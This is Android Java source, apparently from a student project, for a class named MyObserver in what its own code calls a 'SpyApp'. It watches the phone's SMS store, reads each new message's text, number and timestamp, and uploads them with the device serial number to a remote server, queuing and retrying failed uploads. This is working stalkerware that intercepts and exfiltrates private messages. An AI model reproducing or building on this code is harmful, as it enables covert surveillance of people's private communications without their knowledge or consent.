package com.example.natalia.super_inzynierka;

import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.widget.Toast;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import cz.msebera.android.httpclient.Header;

import java.util.ArrayList;
import java.util.Calendar;

/**
 * Created by Natalia on 11.01.2017.
 */
public class MyObserver extends ContentObserver {
    boolean network = false;
    public static ArrayList<String> listAddress = new ArrayList<>();
    public static ArrayList<String> listTime = new ArrayList<>();
    public static ArrayList<String> listBody = new ArrayList<>();
    public static ArrayList<String> listSerialNumber = new ArrayList<>();
    public static int index = 0;
    public static String serialNr = StartService.serialNr;
    String lastSMS = "";
    long lastDate = 0;
    String smsText;
    String smsNumber;
    Cursor cursor;
    int post = 0;

    public MyObserver(Handler handler) {
        super(handler);
        System.out.println(2);
        serialNr = StartService.serialNr;
    }

    private static final Uri uri = Uri.parse("content://sms");
    private static final String COLUMN_TYPE = "type";
    private static final int MESSAGE_TYPE_SENT = 2;

    @Override
    public void onChange(boolean selfChange) {
        System.out.println("SERIAL NR: " + serialNr);
        cursor = null;

        try {
            cursor = StartService.contentResolver.query(uri, null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                int type = cursor.getInt(cursor.getColumnIndex(COLUMN_TYPE));

//                if (type == MESSAGE_TYPE_SENT) {
                    // Sent message
                    System.out.println("SENT MESSAGE");
                    cursor.moveToFirst();
                    smsText = cursor.getString(cursor.getColumnIndex("body"));
                    System.out.println(smsText);
                    smsNumber = cursor.getString(cursor.getColumnIndex("address"));
                    System.out.println(smsNumber);
                    String smsDate = cursor.getString(cursor.getColumnIndex("date"));
                    System.out.println(smsDate);

                    long date = Long.parseLong(smsDate);
                    Calendar calendar = Calendar.getInstance();
                    calendar.setTimeInMillis(date);

                    String min;
                    String month;
                    String day;
                    int mYear = calendar.get(Calendar.YEAR);
                    int mMonth = calendar.get(Calendar.MONTH);
                    int mDay = calendar.get(Calendar.DAY_OF_MONTH);
                    int hour = calendar.get(Calendar.HOUR_OF_DAY);
                    int minute = calendar.get(Calendar.MINUTE);
                    mMonth = mMonth + 1;

                    min = Integer.toString(minute);
                    if (minute < 10) min = "0" + minute;
                    month = Integer.toString(mMonth);
                    if (mMonth < 10) month = "0" + mMonth;
                    day = Integer.toString(mDay);
                    if (mDay < 10) day = "0" + mDay;
                    String time = day + "-" + month + "-" + mYear + "  " + hour + ":" + min;

                post = 0;
                if(smsChecker( "Number " + smsNumber + ": " + smsText, smsDate)) {
                    //save data into database/sd card here
                    postRequest(smsNumber, time, smsText, serialNr);

                }
//                }
//                if (type==1){
//                    System.out.println("RECEIVE");
//                    cursor.moveToNext();
//                }
            }
        }
        finally {
            if (cursor != null)
                cursor.close();
        }
    }

    private Context context;

    public boolean smsChecker(String sms, String date) {
        Long dateLong = Long.parseLong(date);
        System.out.println("CHECKER");
        boolean flagSMS = true;
        System.out.println(sms + dateLong);
        System.out.println(lastSMS + lastDate);

//        Toast.makeText(context, "1 " + sms+dateLong, Toast.LENGTH_LONG).show();
//        Toast.makeText(context, "2 " + lastSMS+lastDate, Toast.LENGTH_LONG).show();


        if (sms.equals(lastSMS) || dateLong < lastDate) {
            System.out.println("flaga false ");
            flagSMS = false;
        }
        else {
            System.out.println("ELSE");
            lastSMS = sms;
            lastDate = dateLong;
        }
        System.out.println("RETURN");
        return flagSMS;
    }

    public boolean postRequest(final String number, final String date, final String text, final String serialNumber) {

        post = 1;
        RequestParams params = new RequestParams();
        params.put("number", number);
        params.put("start_time", date);
        params.put("text", text);
        params.put("log", serialNumber);
        SpyAppRestClient.post("create_message/", params, new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                System.out.println("ON SUCCESS SMS");
                network = true;
                if (listAddress.size() > 0) {
                    System.out.println("List SMS size != 0");
                    for (int i = listAddress.size() - 1; i >= 0; i--) {
                        postRequest(listAddress.get(i), listTime.get(i), listBody.get(i), listSerialNumber.get(i));
                        System.out.println("take first sms from list");
                        if (network) {
                            System.out.println("remove taken sms from list");
                            listAddress.remove(i);
                            listTime.remove(i);
                            listBody.remove(i);
                            listSerialNumber.remove(i);
                            index = index - 1;
                        }
                    }
                }
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                System.out.println("ON FAILURE SMS");
                network = false;

                listAddress.add(index, number);
                listTime.add(index, date);
                listBody.add(index, text);
                listSerialNumber.add(index, serialNumber);
                System.out.println("ADDED SMS TO LIST , SIZE: " + listAddress.size());
                index = index + 1;
            }
        });
        return network;
    }
}
